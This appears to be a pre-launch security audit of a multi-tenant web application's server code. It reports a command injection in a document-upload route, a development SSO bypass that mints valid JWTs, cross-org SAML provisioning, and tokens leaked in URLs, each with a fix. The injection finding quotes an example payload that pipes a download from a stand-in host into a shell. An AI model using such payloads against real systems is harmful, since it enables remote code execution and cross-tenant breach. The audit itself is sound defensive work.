# GA Readiness Audit — Security & Authentication

**Date:** 2026-06-14
**Scope:** `server/` and `shared/` application code (auth, middleware, security-relevant routes). React client and raw DB schema/migrations out of scope.
**Method:** Net-new independent source review. No prior reports consulted.

---

## Executive Summary

_(populated at end)_

---

## Findings

### [HIGH] OS command injection via uploaded protocol content (`/api/analytics/upload-protocol`)

**File:** `server/routes/analytics-routes.ts:88,128,148-150,285,308-310`

`extractedText` — derived from an attacker-uploaded PDF/document — is interpolated
directly into a shell command string and run through `child_process.exec`:

```ts
const result = await execPromise(`python ${analyzerScriptPath} "${extractedText}"`);   // line 128
```
and
```ts
`python -c "... open('${tempScoreFile}', 'r')...` // line 149 (filePath/text interpolated)
```

`exec` invokes `/bin/sh -c`, so any shell metacharacter in the extracted text
(`"; curl evil | sh; "`, `` $(...) ``, backticks) executes arbitrary commands on
the application host with the server's privileges. The file path at line 88/285
(`"${filePath}"`) is multer-generated and lower-risk, but the *content* path is fully
attacker-controlled.

**Reachability:** The global `/api` auth gate (`register-platform-routes.ts:235`)
is registered before this router is mounted (`startup/routes.ts:89` precedes the
analytics mount at `register-project-routes.ts:88-94`), so the endpoint requires a
valid session. This is therefore a **post-authentication RCE**: any authenticated
tenant user (lowest role) can execute code on the host and pivot to other tenants'
data, secrets, and the database. In a regulated multi-tenant SaaS this is a host
compromise / cross-tenant breach vector.

**Why it blocks GA:** Authenticated RCE on shared infrastructure breaks tenant
isolation at the OS level and is a critical control gap for SOC 2 / regulated launch.

**Fix:** Never build shell strings from input. Use `execFile`/`spawn('python3',
[script, filePath])` with an argument array (no shell), pass the document via a temp
file or stdin rather than as an argv string, and validate/normalize file paths. Remove
the `python -c "...open('${...}')..."` construction entirely in favor of a script file
that reads a path argument.

---

### [HIGH] Dev SSO backdoor mints valid production JWTs, gated only on `NODE_ENV`

**File:** `server/routes/sso.ts:19,422-471` (mounted at `register-platform-routes.ts:167-170`)

The generic SSO provider routes contain a development bypass:

```ts
const isDev = process.env.NODE_ENV === 'development';   // line 19
...
router.get('/:provider/initiate', ...) { if (isDev) { /* redirect with dev code */ } }
router.get('/:provider/callback', ...) {
  if (isDev) {
    const token = jwt.sign({ userId:'1', email:'sso-user@example.com',
      organizationId:'2', role:'client_user', provider }, config.jwt.secret, {expiresIn:'24h'});
    return res.redirect(302, `/concept2cure/login?...&sso_token=${token}...`);   // line 460-467
  }
}
```

This issues a **fully valid, signed JWT** for org `2` / user `1` to anyone who hits
`GET /api/auth/sso/<anything>/callback` whenever `NODE_ENV === 'development'`. It is
mounted unconditionally in all environments and gated *only* on `NODE_ENV`, not on the
project's hardened `isDevAuthAllowed()` gate (`server/auth/dev-auth-policy.ts`, which
requires `NODE_ENV==='development' && ALLOW_DEV_AUTH==='1'`). The repo even ships a CI
check (`ci:no-dev-auth-in-prod`) precisely to catch this pattern, but this route does
not use the policy helper.

**Why it blocks GA:** A misconfigured deploy (NODE_ENV unset/typo handled elsewhere,
or a staging box left at `development`) turns an unauthenticated GET into a tenant
login. The `/api/auth/*` prefix is on the auth-gate openlist, so these routes are
reachable **without authentication**. Auth-bypass backdoor reachable by env
misconfiguration is a launch blocker.

**Fix:** Gate both `isDev` branches behind `isDevAuthAllowed()` (the existing helper),
or delete the dev SSO mock entirely and return `501` in all environments until real
OAuth is implemented. Add the route to the `ci:no-dev-auth-in-prod` scan coverage.

---

### [MEDIUM] SAML JIT provisioning hard-codes default org (cross-org placement risk)

**File:** `server/routes/sso.ts:509,555,553-562` and `:226-227`

JIT-provisioned SAML users are unconditionally placed into `organizationId = 1`
(`defaultOrgId = 1`, line 555) and existing users with no org association also fall back
to org `1` (line 509). The org slug used to select the IdP trust anchor comes from
untrusted `RelayState` (lines 226-227) — which is correctly defended for *signature
validation* (a forged response can't validate against any org's cert), but the
**resulting user is still mapped to org 1 regardless of which org's IdP authenticated
them**. In a multi-tenant deployment serving several orgs via `SAML_TENANTS`, a user
authenticated by Org B's IdP is provisioned into Org A (id 1).

**Why it matters for GA:** Incorrect tenant assignment on SSO is a cross-tenant data
exposure / authorization defect for enterprise SSO customers.

**Fix:** Derive the target organization from the validated org slug (map slug → org id)
rather than a hard-coded constant, and reject provisioning when the slug doesn't map to
a known org. Add a contract test that an Org-B assertion never lands a user in Org A.

---

### [MEDIUM] SAML/SSO returns JWT in URL query string (token leakage)

**File:** `server/routes/sso.ts:283-288,460-467`

After SAML callback, the access token is appended to the same-origin `returnTo` path as
a **query parameter** (`?token=...`, line 285-287); the dev SSO callback likewise puts
`sso_token` in the redirect URL (line 462). Tokens in URLs leak via browser history,
`Referer` headers to any third-party resource on the landing page, server access logs,
and proxy logs. The code comment at line 459 claims "URL fragment ... not query string
for security," but the implementation uses a query string.

**Fix:** Deliver the token via a short-lived, `HttpOnly`+`Secure`+`SameSite` cookie or a
one-time exchange code redeemed by the SPA, not as a URL query parameter. At minimum use
the URL fragment (`#token=`) as the comment intends, though a cookie/exchange-code is the
correct GA pattern.

---

